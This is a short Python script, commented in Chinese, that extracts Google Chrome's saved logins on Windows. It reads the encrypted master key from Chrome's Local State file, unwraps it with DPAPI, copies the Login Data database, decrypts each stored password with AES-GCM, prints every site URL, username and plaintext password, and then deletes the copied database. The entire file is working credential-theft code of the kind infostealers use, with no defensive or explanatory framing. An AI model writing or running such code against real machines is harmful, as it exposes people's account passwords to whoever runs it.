import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import time

#获得加密密钥
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    en_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

    key=win32crypt.CryptUnprotectData(en_key[5:], None, None, None, 0)[1]
    return key

#解密password
def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""


if __name__ == "__main__":
    t1=time.time()
    key = get_encryption_key()
    #加密密钥存储的路径
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)#将文件内容复制到副本中
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute(
        "select origin_url, action_url, username_value, password_value,\
         date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            print(f"Origin URL: {origin_url}")  #原始网址
            print(f"Action URL: {action_url}")  #操作网址
            print(f"Username: {username}")      #用户名
            print(f"Password: {password}")      #密码
        else:
            continue
        print("=" * 50)
    t2=time.time()
    print('get time: ',t2-t1,'s') #时间
    cursor.close()
    db.close()
    try:
        os.remove(filename)  #删除数据库副本
    except:
        pass



